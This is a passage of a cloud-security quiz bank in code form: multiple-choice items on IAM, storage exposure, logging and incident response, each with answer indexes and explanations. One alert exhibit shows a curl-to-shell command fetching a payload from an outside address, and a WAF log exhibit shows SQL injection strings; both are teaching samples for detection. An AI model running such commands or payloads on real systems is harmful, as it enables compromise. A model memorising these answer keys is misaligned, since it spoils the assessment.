    id: 1089, rank: 1, role: "cloud-security", topic: "Block Public Access Setting", difficulty: "INTERMEDIATE",
    q: "Which account-level control best prevents accidental public exposure of storage buckets?",
    options: ["A larger bucket size","A reminder to developers","A naming standard","Block public access enforced at the account or organisation level"],
    correct: 3, why: "Preventive account-level settings override mistakes in individual policies.",
    hint: "Prevent, do not remind."
  },
  {
    id: 1090, rank: 1, role: "cloud-security", topic: "Zone Redundancy Versus Backup", difficulty: "INTERMEDIATE",
    q: "A team believes multi-zone deployment replaces backups. What is the correct view?",
    options: ["Redundancy handles infrastructure failure but not deletion, corruption or ransomware, which need backups","It does replace backups","Backups are only for old systems","Both are identical"],
    correct: 0, why: "Replication copies mistakes and malicious changes as well as good data.",
    hint: "Replication is not backup."
  },
  {
    id: 1091, rank: 1, role: "cloud-security", topic: "Role vs User Keys", difficulty: "INTERMEDIATE",
    q: "Why prefer roles with temporary credentials over long-lived user keys?",
    options: ["Roles never need permissions","Credentials expire automatically which limits misuse","Users can share them easily","Keys are faster to type"],
    correct: 1, why: "Temporary credentials reduce the window of misuse.",
    hint: "Short-lived."
  },
  {
    id: 1092, rank: 1, role: "cloud-security", topic: "Network ACL Review", difficulty: "INTERMEDIATE",
    q: "What is the difference between a security group and a network ACL?",
    options: ["ACLs apply only to users, and have no effect on the traffic between the servers","Security groups are stateful on resources and ACLs are stateless on subnets","They are identical in every way, and can be swapped for each other at any time","Security groups apply only to storage"],
    correct: 1, why: "They operate at different layers and have different behaviour.",
    hint: "Stateful versus stateless."
  },
  {
    id: 1093, rank: 1, role: "cloud-security", topic: "CloudTrail Gap Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Trail: main-trail  Multi-region: NO  Home region: eu-west-1\nLog file validation: ON  Encryption: ON\nData events: OFF  Delivery bucket: audit-logs-prod (same account)",
    q: "What does this audit log configuration show?",
    options: ["Logging is disabled in some regions leaving blind spots","All regions are logged to a protected account","Management events are recorded","Logs are encrypted and validated"],
    correct: 0, why: "Single-region logging misses activity elsewhere.",
    hint: "Regions."
  },
  {
    id: 1094, rank: 1, role: "cloud-security", topic: "Patching Managed Services", difficulty: "INTERMEDIATE",
    q: "Who patches the underlying database engine in a fully managed database service?",
    options: ["The customer's end users who log in to the application every day of the week","The customer's finance team who approve the invoice for the service each month","Nobody, as managed databases never need any patches to be applied to the engine","The cloud provider"],
    correct: 3, why: "Managed services shift infrastructure patching to the provider.",
    hint: "Managed means provider."
  },
  {
    id: 1095, rank: 1, role: "cloud-security", topic: "Least Privilege for Functions", difficulty: "INTERMEDIATE",
    q: "How should a serverless function be given permissions?",
    options: ["A dedicated role with only the actions it needs","The developer's own permissions","The administrator role for convenience","No permissions at all, and hardcoded keys stored inside the function code instead"],
    correct: 0, why: "Scoped roles limit impact.",
    hint: "Dedicated role."
  },
  {
    id: 1096, rank: 1, role: "cloud-security", topic: "Cost Anomaly as Signal", difficulty: "INTERMEDIATE",
    q: "A sudden cloud cost spike may indicate what security issue?",
    options: ["A tag was added to a resource by the team that owns the project in the account","A user changed their password after the monthly reminder that the helpdesk sends","Unauthorised resources created for abuse such as mining","A scheduled backup finished as planned and used the usual amount of storage space"],
    correct: 2, why: "Unexpected spending can reveal compromise.",
    hint: "Cost spike."
  },
  {
    id: 1097, rank: 1, role: "cloud-security", topic: "Key Rotation Policy", difficulty: "INTERMEDIATE",
    q: "Why rotate encryption keys periodically?",
    options: ["To limit the amount of data exposed by a single key","To disable logging","To remove the need for backups","To increase storage"],
    correct: 0, why: "Rotation reduces long-term exposure.",
    hint: "Limit exposure."
  },
  {
    id: 1098, rank: 1, role: "cloud-security", topic: "Private Endpoint Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "App subnet 10.1.2.0/24 -> VPC endpoint (vpce-0a12) -> Storage service\nRoute: no NAT, no internet gateway\nBucket policy: aws:SourceVpce = vpce-0a12",
    q: "Which design does this diagram summary describe?",
    options: ["Storage is open to all users","Traffic to storage goes over the public internet, in most cases","Traffic to the storage service stays on the private network","Storage has no access controls"],
    correct: 2, why: "A private endpoint keeps access off the internet.",
    hint: "Endpoint type."
  },
  {
    id: 1099, rank: 1, role: "cloud-security", topic: "Wildcard Principal Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::reports-prod/*\"}",
    q: "What is the main risk in this resource policy?",
    options: ["It lets any principal read the objects","It only applies to uploads and has no effect on any attempt to read the objects","It restricts access to one named role that the pipeline uses to publish reports","It denies all access to every principal including the owner of the account"],
    correct: 0, why: "A wildcard principal opens the resource to everyone.",
    hint: "Look at the principal."
  },
  {
    id: 1100, rank: 1, role: "cloud-security", topic: "Safe Snapshot Handling", difficulty: "INTERMEDIATE",
    q: "A snapshot must be copied to another region for resilience. What is the BEST way to protect it?",
    options: ["Email the snapshot file to the team that runs the other region as an attachment","Make it public and the engineers in the other region can find it easily","Store the snapshot in a personal account that one of the engineers controls, as soon as practical","Encrypt it with a managed key, and limit who can copy it"],
    correct: 3, why: "Public sharing is the runner-up as it is fast, but anyone could then copy the data.",
    hint: "Encrypt and restrict."
  },
  {
    id: 1101, rank: 2, role: "cloud-security", topic: "PassRole Risk", difficulty: "ADVANCED",
    exhibit: "{\"Effect\":\"Allow\",\"Action\":[\"iam:PassRole\",\"ec2:RunInstances\"],\"Resource\":\"*\"}",
    q: "Why is this permission a privilege escalation risk?",
    options: ["It blocks all role use","It only affects the billing reports that finance teams review each month","It lets the user read only the logs of services that run in one account","It lets the user hand powerful roles to services they launch"],
    correct: 3, why: "Passing a more privileged role to a compute service lets the user act with those permissions.",
    hint: "Which roles can be passed."
  },
  {
    id: 1102, rank: 2, role: "cloud-security", topic: "Access Key Age Finding", difficulty: "ADVANCED",
    exhibit: "User      Key1 Age  Last Used   MFA\nci-deploy 812 days  2 days ago  no\nold-batch 1190 days never       no\nalice     41 days   today       yes",
    q: "What is the most important remediation for this access key report?",
    options: ["Add more tags, until the next scheduled review takes place","Change the default region of the account and keep every key as it is today","Rename the users, and revisit the decision after the next release","Rotate or remove the old keys and move workloads to roles"],
    correct: 3, why: "Old, unused long-lived keys are common sources of compromise.",
    hint: "Old keys."
  },
  {
    id: 1103, rank: 2, role: "cloud-security", topic: "S3 Access Log Anomaly", difficulty: "ADVANCED",
    exhibit: "203.0.113.9 LIST bucket=hr-archive 200\n203.0.113.9 GET hr-archive/payroll-01.csv 200\n203.0.113.9 GET hr-archive/payroll-02.csv 200\n203.0.113.9 GET hr-archive/payroll-03.csv 200\n... 2,140 GETs in 6 minutes",
    q: "What does this access log pattern suggest?",
    options: ["A static page request that a content network makes to refresh its cache","A normal website visit by a customer who browses several public pages","One address listing and downloading many objects quickly","A scheduled backup"],
    correct: 2, why: "Rapid enumeration and download from one address may indicate data theft.",
    hint: "Volume from one IP."
  },
  {
    id: 1104, rank: 2, role: "cloud-security", topic: "Subdomain Takeover Risk", difficulty: "ADVANCED",
    exhibit: "shop-old.example.com. CNAME shop-old-2019.azurewebsites.net.\nResolution: NXDOMAIN (resource deleted)",
    q: "DNS shows a CNAME pointing to a cloud app name that was deleted. What is the BEST action?",
    options: ["Leave it as nobody uses it","Remove the dangling record and review other stale DNS entries","Change the TTL value and the record expires from caches much sooner","Create a new app with the same name later, once somebody needs it again"],
    correct: 1, why: "Leaving it is the runner-up as it appears unused, but an attacker can claim the name and serve content on your domain.",
    hint: "Dangling record."
  },
  {
    id: 1105, rank: 2, role: "cloud-security", topic: "Kubernetes Audit Anomaly", difficulty: "ADVANCED",
    exhibit: "verb: create\nresource: clusterrolebindings\nuser: system:serviceaccount:dev:build-bot\nrequestObject: roleRef=cluster-admin subject=sa:default:tmp",
    q: "Which Kubernetes audit event is the most suspicious?",
    options: ["A config map read by its owner","A deployment scaled up by the pipeline account during the release window","A new cluster-admin binding for an unknown service account","A pod listing by the monitoring account that runs on a regular schedule"],
    correct: 2, why: "Unexpected cluster-admin bindings indicate privilege escalation or persistence.",
    hint: "Cluster-admin grant."
  },
  {
    id: 1106, rank: 2, role: "cloud-security", topic: "SCP Evaluation", difficulty: "ADVANCED",
    q: "An SCP denies disabling audit logging, yet a root administrator in a member account tries to stop it. What is the result?",
    options: ["It is denied, as the SCP applies to every identity in the account","The SCP is ignored","It is allowed on weekdays when the security team is available to approve it","It is allowed as a root user is exempt from all organisation rules"],
    correct: 0, why: "SCPs restrict all principals in member accounts, including their root users.",
    hint: "SCPs bind members."
  },
  {
    id: 1107, rank: 2, role: "cloud-security", topic: "Lambda Secret Exposure", difficulty: "ADVANCED",
    q: "Database credentials are stored in a function's plain environment variables. What is the best improvement?",
    options: ["Fetch secrets at runtime from a secrets service","Add a comment in the code","Encode it with Base64","Make the variable name shorter, and it is harder to notice in the console"],
    correct: 0, why: "Environment variables are visible to anyone who can read the configuration.",
    hint: "Use a secrets service."
  },
  {
    id: 1108, rank: 2, role: "cloud-security", topic: "Drift Detection", difficulty: "ADVANCED",
    q: "The deployed security group has an open SSH rule that is not in the Terraform code. What does this indicate?",
    options: ["A normal result","Drift from a manual change that should be reviewed and reverted","An encryption error that the key service reports during every deployment run","A billing error"],
    correct: 1, why: "Manual changes bypass review and can introduce exposure.",
    hint: "Unmanaged change."
  },
  {
    id: 1109, rank: 2, role: "cloud-security", topic: "Cross-Account Access Finding", difficulty: "ADVANCED",
    exhibit: "\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"}\n\"Action\":\"s3:GetObject\"\n\"Resource\":\"arn:aws:s3:::backup-prod/*\"",
    q: "A storage bucket policy grants access to an external account ID that nobody recognises. What should you do?",
    options: ["Ignore it, and review the outcome at the next monthly meeting","Add more grants, and revisit the decision after the next release","Investigate the principal and remove the grant if unapproved","Assume it belongs to a partner, and leave it in place until somebody complains"],
    correct: 2, why: "Unknown external principals may indicate unauthorised sharing or compromise.",
    hint: "Unknown account."
  },
  {
    id: 1110, rank: 2, role: "cloud-security", topic: "WAF Log Reading", difficulty: "ADVANCED",
    exhibit: "10:02:01 BLOCK rule=SQLi-QueryArgs src=198.51.100.7 uri=/search?q=1' OR '1'='1\n10:02:02 BLOCK rule=SQLi-QueryArgs src=198.51.100.7 uri=/search?q=1;DROP TABLE\n10:02:03 BLOCK rule=SQLi-Body src=198.51.100.7 uri=/login",
    q: "What do these WAF log entries suggest?",
    options: ["A load balancer health check that the service sends every few seconds to the app","A normal user session","A software update","Repeated injection attempts from one source that are blocked"],
    correct: 3, why: "Repeated blocked rule matches from one client suggest automated probing.",
    hint: "Same rule, same source."
  },
  {
    id: 1111, rank: 2, role: "cloud-security", topic: "Data Perimeter", difficulty: "ADVANCED",
    q: "An organisation wants to ensure its data can only be accessed by its own identities from its own networks. What is the BEST design?",
    options: ["Enable only logging","Organisation-wide resource policies, endpoint policies and network conditions, in most cases","Rely on strong passwords for users","Public sharing links that expire after seven days, and need no sign-in at all for the recipient"],
    correct: 1, why: "Strong passwords are the runner-up since they are familiar, but they cannot prevent a valid credential being used from outside.",
    hint: "Identity and network conditions."
  },
  {
    id: 1112, rank: 2, role: "cloud-security", topic: "Orphaned Snapshot Review", difficulty: "ADVANCED",
    q: "Which risk is created by old unencrypted disk snapshots shared across accounts?",
    options: ["Faster restores","Data exposure from forgotten and uncontrolled copies","Lower cost","Improved restore performance as there are more copies of the same disk available"],
    correct: 1, why: "Forgotten snapshots may contain sensitive data and weak permissions.",
    hint: "Forgotten copies."
  },
  {
    id: 1113, rank: 2, role: "cloud-security", topic: "Detecting Role Chaining", difficulty: "ADVANCED",
    exhibit: "02:10:01 AssumeRole acct=111 role=dev-reader src=203.0.113.44\n02:10:19 AssumeRole acct=222 role=ops-admin src=203.0.113.44\n02:10:44 AssumeRole acct=333 role=data-export src=203.0.113.44",
    q: "Which log pattern best indicates an attacker chaining role assumptions to move across accounts?",
    options: ["A billing report","A single login by a user","A storage listing made by an auditor who reviews the buckets during working hours","Several AssumeRole events across accounts from one new address"],
    correct: 3, why: "Successive assumptions from a new source suggest lateral movement.",
    hint: "Chain of AssumeRole."
  },
  {
    id: 1114, rank: 2, role: "cloud-security", topic: "Managed Identity Misuse", difficulty: "ADVANCED",
    q: "In a managed cloud service, an application's identity has contributor rights on the whole subscription. What is the best remediation?",
    options: ["Remove all roles from everyone","Scope the role to the specific resources and actions required, then record the result in the ticket","Disable monitoring","Add another identity with the same rights"],
    correct: 1, why: "Right-sizing and scoping reduce blast radius.",
    hint: "Scope it down."
  },
  {
    id: 1115, rank: 2, role: "cloud-security", topic: "Instance Isolation Procedure", difficulty: "ADVANCED",
    q: "A virtual machine is suspected of compromise. What is the BEST cloud-native containment step that preserves evidence?",
    options: ["Terminate the instance immediately","Delete the security group and the instance loses all of its network access at once","Reboot it repeatedly","Isolate with a security group, then snapshot disks and capture memory"],
    correct: 3, why: "Terminating is the runner-up since it stops the threat, but it destroys volatile evidence and may remove forensic data.",
    hint: "Isolate, then capture."
  },
  {
    id: 1116, rank: 2, role: "cloud-security", topic: "Key Usage Anomaly", difficulty: "ADVANCED",
    q: "Which KMS event best suggests misuse of an encryption key?",
    options: ["A routine encryption call that the application makes whenever it saves a customer record","A burst of Decrypt calls from an unusual principal at night, in most cases","A key description change by the owner","Key rotation on schedule"],
    correct: 1, why: "Unusual decrypt volume may show bulk data access.",
    hint: "Decrypt burst."
  },
  {
    id: 1117, rank: 2, role: "cloud-security", topic: "Public Container Registry", difficulty: "ADVANCED",
    q: "A container registry repository is set to public and contains internal images. What is the best action?",
    options: ["Make it private, review pulls and rotate any baked-in secrets","Leave it public","Change the image tag","Delete the registry name, and recreate a similar repository whenever it is needed again"],
    correct: 0, why: "Images often contain secrets and proprietary code.",
    hint: "Private and review."
  },
  {
    id: 1118, rank: 2, role: "cloud-security", topic: "Org-Wide Logging Gap", difficulty: "ADVANCED",
    q: "An audit finds that two of fifty accounts have no audit trail enabled. What is the best structural fix?",
    options: ["Ask account owners to enable the trail themselves when they next have time to do it","Accept the risk","Review them annually, until the next scheduled review takes place","Enforce an organisation trail and block anyone from disabling it"],
    correct: 3, why: "Central enforcement prevents gaps.",
    hint: "Enforce centrally."
  },
  {
    id: 1119, rank: 2, role: "cloud-security", topic: "Token Lifetime Review", difficulty: "ADVANCED",
    q: "Which setting best reduces the impact of stolen cloud console sessions?",
    options: ["Short sessions with re-authentication, and conditional access, as a general rule","Disabling MFA","Sharing sessions","Very long sessions for convenience, and staff never have to sign in again at work"],
    correct: 0, why: "Shorter sessions limit the window of misuse.",
    hint: "Short sessions."
  },
  {
    id: 1120, rank: 2, role: "cloud-security", topic: "Egress Control Finding", difficulty: "ADVANCED",
    q: "Servers in a private subnet have unrestricted outbound internet access. What is the main risk?",
    options: ["Lower availability","Malware can reach command servers and data can leave unseen","Higher storage cost caused by the extra log volume that the traffic would generate","Slower deployments"],
    correct: 1, why: "Egress filtering and monitoring limit post-compromise activity.",
    hint: "Unrestricted egress."
  },
  {
    id: 1121, rank: 2, role: "cloud-security", topic: "CSPM Prioritisation", difficulty: "ADVANCED",
    q: "A posture tool reports 5,000 findings. What is the BEST triage approach?",
    options: ["Fix findings in alphabetical order, and every team can follow the queue easily","Fix only the oldest findings, and close the rest once the backlog gets smaller","Rank by exposure and data sensitivity and fix toxic mixes first","Suppress all low findings and review the remaining ones at the next audit round"],
    correct: 2, why: "Oldest first is the runner-up since it clears backlog, but age says little about risk.",
    hint: "Toxic combinations."
  },
  {
    id: 1122, rank: 2, role: "cloud-security", topic: "Service Account Key Policy", difficulty: "ADVANCED",
    q: "A cloud project allows creation of user-managed service account keys. What control is best?",
    options: ["Disable key creation by policy and use workload identity instead","Allow it everywhere, and revisit the decision after the next release","Share keys by email","Rotate by memory, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Preventive policy removes the long-lived key risk.",
    hint: "Disable keys."
  },
  {
    id: 1123, rank: 2, role: "cloud-security", topic: "Peering Routing Risk", difficulty: "ADVANCED",
    q: "Two networks are peered. Why must route tables and security groups still be reviewed?",
    options: ["Peering gives reachability, so open rules expose resources, in the first instance","Peering blocks all traffic","Peering encrypts all traffic automatically and, and removes any need for further rules","Peering removes the need for firewalls"],
    correct: 0, why: "Connectivity does not imply authorisation.",
    hint: "Reachability is not trust."
  },
  {
    id: 1124, rank: 2, role: "cloud-security", topic: "Metadata Service Alert", difficulty: "ADVANCED",
    q: "An alert shows a container calling the instance metadata endpoint for role credentials. What does this suggest?",
    options: ["Possible credential theft from the node if the pod should not need the node role","A scheduled backup","Normal DNS","A CPU spike"],
    correct: 0, why: "Pods normally use workload identity, not the node's credentials.",
    hint: "Pod asking for node creds."
  },
  {
    id: 1125, rank: 2, role: "cloud-security", topic: "Backup Plan Gaps", difficulty: "ADVANCED",
    q: "A restore test fails because the encryption key was deleted. What lesson applies?",
    options: ["Use shorter keys, until the next scheduled review takes place","Keys are not important","Protect keys and include them in recovery tests","Backups do not need testing once the first successful copy has been completed"],
    correct: 2, why: "Backups are useless without the keys.",
    hint: "Keys in the plan."
  },
  {
    id: 1126, rank: 2, role: "cloud-security", topic: "Cloud DLP Use", difficulty: "ADVANCED",
    q: "How can cloud data loss prevention help protect stored data?",
    options: ["By lowering the bill","By discovering and classifying sensitive data, and applying controls or alerts, as a general rule","By deleting logs","By speeding up queries"],
    correct: 1, why: "Discovery enables targeted controls.",
    hint: "Find sensitive data."
  },
  {
    id: 1127, rank: 2, role: "cloud-security", topic: "Overly Broad Network Rule", difficulty: "ADVANCED",
    q: "Which rule most clearly violates least privilege?",
    options: ["Allow 443 from the load balancer to the app tier, in the first instance","Allow all protocols from 0.0.0.0/0 to the database subnet","Allow DNS to the resolver, until the next scheduled review takes place","Allow 5432 from the app tier to the database, then record the result in the ticket"],
    correct: 1, why: "Exposing everything from anywhere to the database is unrestricted exposure.",
    hint: "All from anywhere."
  },
  {
    id: 1128, rank: 2, role: "cloud-security", topic: "Break Glass Review", difficulty: "ADVANCED",
    q: "What should happen after a break-glass account is used in an emergency?",
    options: ["Leave the session open","Nothing","Review the activity, rotate the credentials and document the justification, and review the outcome at the next monthly meeting","Share the password"],
    correct: 2, why: "Emergency access must be accountable and reset.",
    hint: "Review and rotate."
  },
  {
    id: 1129, rank: 2, role: "cloud-security", topic: "API Rate and Abuse", difficulty: "ADVANCED",
    q: "A public cloud API is receiving credential stuffing traffic. Which control is best?",
    options: ["Turning off logs, and review the outcome at the next monthly meeting","Rate limiting, bot protection and MFA or token controls at the edge","Adding more servers only, and review the outcome at the next monthly meeting","Hiding the API URL, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Edge controls reduce abuse without scaling attackers' success.",
    hint: "Edge controls."
  },
  {
    id: 1130, rank: 2, role: "cloud-security", topic: "Encryption Context", difficulty: "ADVANCED",
    q: "Why use encryption context in key requests?",
    options: ["It disables rotation","It hides logs","It shortens keys","It binds ciphertext to a specific purpose and appears in logs for auditing"],
    correct: 3, why: "Context prevents using ciphertext in a different setting.",
    hint: "Bind and audit."
  },
  {
    id: 1131, rank: 2, role: "cloud-security", topic: "Resource Ownership Gaps", difficulty: "ADVANCED",
    q: "Many resources have no owner tag and no contact. What is the best action?",
    options: ["Rename the account, and it reflects the department that probably created the resources","Delete everything, until the next scheduled review takes place","Enforce ownership tags and clean up unowned resources","Ignore"],
    correct: 2, why: "Ownership enables response and accountability.",
    hint: "Mandatory owners."
  },
  {
    id: 1132, rank: 2, role: "cloud-security", topic: "Pipeline Role Permissions", difficulty: "ADVANCED",
    q: "A deployment pipeline role has permissions to modify IAM and delete logs. What is the BEST improvement?",
    options: ["Add another admin","Share it with the developers","Restrict it to the deployment actions required and prevent changes to logging and IAM boundaries","Keep it for flexibility"],
    correct: 2, why: "Keeping it for flexibility is the runner-up as pipelines can break, but a compromised pipeline then controls the account.",
    hint: "Scope the pipeline."
  },
  {
    id: 1133, rank: 2, role: "cloud-security", topic: "Anomaly in Storage Deletion", difficulty: "ADVANCED",
    q: "Which alert pattern best signals possible ransomware activity in cloud storage?",
    options: ["A new bucket","Normal uploads","Mass object overwrite and deletion events by one identity","A permissions read"],
    correct: 2, why: "Bulk destructive changes are a ransomware signature.",
    hint: "Mass change."
  },
  {
    id: 1134, rank: 2, role: "cloud-security", topic: "Compliance Evidence in Cloud", difficulty: "ADVANCED",
    q: "How can a team produce continuous evidence that encryption is enabled on all databases?",
    options: ["Automated configuration rules that report compliance and non-compliance","An email statement","A verbal promise","A manual screenshot each year"],
    correct: 0, why: "Automated checks give timely and verifiable evidence.",
    hint: "Automated rules."
  },
  {
    id: 1135, rank: 2, role: "cloud-security", topic: "Third-Party Integration Risk", difficulty: "ADVANCED",
    q: "A SaaS tool asks for broad read and write access to your cloud account. What is the best response?",
    options: ["Share a user password, until the next scheduled review takes place","Disable logging for it","Grant administrator, until the next scheduled review takes place","Grant the minimum scoped role, review its use and monitor it"],
    correct: 3, why: "Third parties should have least privilege and monitoring.",
    hint: "Least privilege."
  },
  {
    id: 1136, rank: 2, role: "cloud-security", topic: "Auto Scaling and Images", difficulty: "ADVANCED",
    q: "Why should auto-scaling groups use hardened, pre-approved images?",
    options: ["They start faster only","They need no patching","Every new instance starts from a trusted baseline","They cost less only"],
    correct: 2, why: "Consistent baselines avoid insecure variation.",
    hint: "Trusted baseline."
  },
  {
    id: 1137, rank: 2, role: "cloud-security", topic: "Open Database Port", difficulty: "ADVANCED",
    exhibit: "sg-0a1 inbound\n443   tcp 10.0.1.0/24   app-lb\n22    tcp 10.9.0.0/16   vpn\n5432  tcp 0.0.0.0/0     any",
    q: "What is the main concern in this security group export?",
    options: ["DNS traffic is allowed to the internal resolver that the platform team operates","The web port is open only to the load balancer that fronts the application tier","SSH is limited to the VPN range that the network team manages, and reviews","The database port is open to the whole internet"],
    correct: 3, why: "A database reachable from any address is exposed to scanning and credential attacks.",
    hint: "Look at 0.0.0.0/0."
  },
  {
    id: 1138, rank: 2, role: "cloud-security", topic: "Unencrypted Volume Finding", difficulty: "ADVANCED",
    exhibit: "vol-0f3  env=prod  size=500GB  encrypted=false  attached=db-prod-1\nvol-0f4  env=prod  size=200GB  encrypted=true   attached=app-prod-2",
    q: "What does this configuration report show?",
    options: ["A production volume that is encrypted with a key that the customer manages itself","A volume that was deleted last week after the migration project was finished","A production volume that holds data without encryption","A volume that is attached only to a test host, and holds no real data at all"],
    correct: 2, why: "Production data volumes should be encrypted at rest.",
    hint: "Encrypted: false."
  },
  {
    id: 1139, rank: 2, role: "cloud-security", topic: "Console Login Alert", difficulty: "ADVANCED",
    exhibit: "ConsoleLogin user=root src=198.51.100.88 country=unexpected MFA=false result=Success\nConsoleLogin user=dev-ana src=10.1.2.3 MFA=true result=Success",
    q: "Which detail makes this sign-in event the most worrying?",
    options: ["A read-only auditor sign-in from the head office network during a review","A developer sign-in with MFA that happens during the normal office hours","A service role that refreshes its session as the scheduled job starts up","A root sign-in from a new country without MFA"],
    correct: 3, why: "Root use without MFA from an unusual place suggests account takeover.",
    hint: "Root and no MFA."
  },
  {
    id: 1140, rank: 2, role: "cloud-security", topic: "Shared Responsibility Check", difficulty: "ADVANCED",
    q: "Who is responsible for patching the guest operating system on a customer-managed virtual machine?",
    options: ["The hardware vendor that supplied the physical servers to the provider originally","The customer who runs the virtual machine","The provider's data centre staff, who manage every guest system for each customer","The internet provider that carries the traffic between the customer, and the cloud"],
    correct: 1, why: "In IaaS the customer manages the guest operating system and its patches.",
    hint: "IaaS split."
  },
  {
    id: 1141, rank: 2, role: "cloud-security", topic: "Anomalous API Calls Exhibit", difficulty: "ADVANCED",
    exhibit: "02:14 ListUsers  role=build-ci  src=203.0.113.5\n02:14 ListRoles  role=build-ci\n02:14 ListBuckets role=build-ci\n02:15 GetAccountAuthorizationDetails role=build-ci\nUsual calls for build-ci: PutObject, GetObject",
    q: "What does this activity indicate?",
    options: ["A role calling many discovery APIs it never used before","A user reading documentation","Normal deployment activity by the pipeline","A scheduled backup"],
    correct: 0, why: "A burst of enumeration calls suggests an attacker exploring the account.",
    hint: "Discovery calls."
  },
  {
    id: 1142, rank: 2, role: "cloud-security", topic: "Container Registry Scanning", difficulty: "ADVANCED",
    q: "Why scan container images in the registry?",
    options: ["To find known vulnerabilities before deployment","To reduce the image size and it is quicker to pull on the cluster nodes","To delete unused tags that the teams created while they were testing builds","To hide the images from other teams, and nobody can reuse the same layers"],
    correct: 0, why: "Scanning provides early detection of weaknesses.",
    hint: "Pre-deploy scan."
  },
  {
    id: 1143, rank: 2, role: "cloud-security", topic: "Shared VPC Risks", difficulty: "ADVANCED",
    q: "Multiple teams share one network. What is the BEST way to reduce risk?",
    options: ["Use one security group for everything, and review the outcome at the next monthly meeting","Allow all traffic inside the shared network, and revisit the decision after the next release","Give every team the same administrator rights, and revisit the decision after the next release","Segment with separate subnets and strict security rules per team"],
    correct: 3, why: "Allowing all traffic is the runner-up as it is simple, but one compromised workload could reach everyone.",
    hint: "Segment."
  },
  {
    id: 1144, rank: 2, role: "cloud-security", topic: "Alert on Policy Change", difficulty: "ADVANCED",
    q: "Which event should trigger a high priority alert?",
    options: ["A scheduled snapshot of the database that runs every night at the same time","A change that disables audit logging, in most cases","A new tag added to an instance by the team that owns the application service","A user viewing a dashboard in the console during the normal working day hours"],
    correct: 1, why: "Disabling logging may hide an attack.",
    hint: "Logging off."
  },
  {
    id: 1145, rank: 2, role: "cloud-security", topic: "Incident Isolation Exhibit", difficulty: "ADVANCED",
    exhibit: "Alert: GuardDuty CryptoCurrency:EC2/BitcoinTool.B!DNS\nInstance: i-0f31 (prod-api-3)  Region: eu-west-1\nSeverity: High  First seen: 11:02\nSecurity group: sg-prod-api (outbound all)",
    q: "What is the best next step given this alert?",
    options: ["Isolate the instance and capture evidence","Delete all instances in the account, and revisit the decision after the next release","Ignore it as a false alarm, as a first step","Disable the alert rule"],
    correct: 0, why: "Contain and preserve evidence.",
    hint: "Contain."
  },
  {
    id: 1146, rank: 2, role: "cloud-security", topic: "S3 Object Lock", difficulty: "ADVANCED",
    q: "What does object lock provide for backups?",
    options: ["Protection from deletion or alteration for a retention period","Faster downloads of large files for the users who work in the head office buildings","Automatic classification of the files into groups by their business sensitivity","Free storage for the first ten years of data that the customer decides to save"],
    correct: 0, why: "Immutability resists ransomware.",
    hint: "Immutable."
  },
  {
    id: 1147, rank: 2, role: "cloud-security", topic: "Cross-Account Logging", difficulty: "ADVANCED",
    q: "Why send logs to a dedicated security account?",
    options: ["So that logs are faster","So that logs are public","So that compromised workload admins cannot erase them","So that logs are smaller"],
    correct: 2, why: "Separation protects evidence.",
    hint: "Separate account."
  },
  {
    id: 1148, rank: 2, role: "cloud-security", topic: "Workload Identity Gap", difficulty: "ADVANCED",
    q: "What is the best fix for a function using stored access keys?",
    options: ["Store the keys in the code, until the next scheduled review takes place","Rename the keys, then record the result in the ticket","Replace keys with an assigned execution role","Share the keys with others"],
    correct: 2, why: "Roles avoid long-lived credentials.",
    hint: "Use roles."
  },
  {
    id: 1149, rank: 2, role: "cloud-security", topic: "Vault Integration Benefits", difficulty: "ADVANCED",
    q: "Why integrate applications with a central secrets vault?",
    options: ["Applications run faster without authentication","Secrets can be shared in chat safely","Developers no longer need permissions","Credentials can be rotated and access audited in one place"],
    correct: 3, why: "Central vaulting reduces secret sprawl.",
    hint: "Central rotation."
  },
  {
    id: 1150, rank: 2, role: "cloud-security", topic: "Runtime Threat Detection Exhibit", difficulty: "ADVANCED",
    exhibit: "Alert: Unexpected shell in container\nPod: payments-api-7d9\nProcess: /bin/sh -c curl http://203.0.113.19/x | sh\nParent: node app.js\nImage digest: sha256:4af1... (signed: yes)",
    q: "What does this runtime alert indicate?",
    options: ["A normal health check from the orchestrator","A routine image pull","A scheduled log rotation","A container started an unexpected shell and contacted an unknown address"],
    correct: 3, why: "Unexpected shells and outbound calls suggest a compromised container.",
    hint: "Shell and outbound."
  },
  {
    id: 1151, rank: 3, role: "cloud-security", topic: "Landing Zone Design", difficulty: "EXPERT",
    q: "A company is moving 200 workloads to the cloud. What is the BEST account structure for security?",
    options: ["One shared account with tags for every team, and workload, in most cases","Two accounts only with manual reviews every quarter, as a general rule","One account per developer with no central governance, as a general rule","Separate accounts per environment with central guardrails"],
    correct: 3, why: "One shared account is the runner-up as it is simple to run, but it gives a large blast radius and weak separation of duties.",
    hint: "Blast radius."
  },
  {
    id: 1152, rank: 3, role: "cloud-security", topic: "Hub and Spoke Inspection", difficulty: "EXPERT",
    q: "Which design inspects traffic between spoke networks centrally?",
    options: ["A hub network with a shared firewall in the path","Public IP addresses on every workload for easy access","Direct peering between all spokes with no inspection","One flat network that contains every workload together"],
    correct: 0, why: "A hub forces traffic through one inspection point.",
    hint: "Central path."
  },
  {
    id: 1153, rank: 3, role: "cloud-security", topic: "Policy Evaluation Exhibit", difficulty: "EXPERT",
    exhibit: "Identity policy: Allow ec2:RunInstances on *\nSCP: Deny * when aws:RequestedRegion not in [eu-west-1, eu-west-2]\nRequest: RunInstances region=ap-south-1\nResult: AccessDenied (explicit deny in SCP)",
    q: "Why does this request fail even though the identity policy allows it?",
    options: ["The bucket was created on a weekday by the same team","The role session is too short to finish the request","The identity policy has a typing error in the action name that the console hides","An organisation policy denies it outside approved regions"],
    correct: 3, why: "An explicit deny from an organisation guardrail overrides any allow.",
    hint: "Explicit deny wins."
  },
  {
    id: 1154, rank: 3, role: "cloud-security", topic: "Key Control for Regulators", difficulty: "EXPERT",
    q: "A regulator requires that the company controls when encryption keys can be used. What is the BEST design?",
    options: ["Keys stored in plain text in the code repository, in most cases","Customer-managed keys with scoped policies and audited use","Provider-owned default keys that the customer cannot see","One shared key for every service, and every account, as a general rule"],
    correct: 1, why: "Provider-owned keys are the runner-up as they need no work, but the company cannot control or audit their use.",
    hint: "Control and audit."
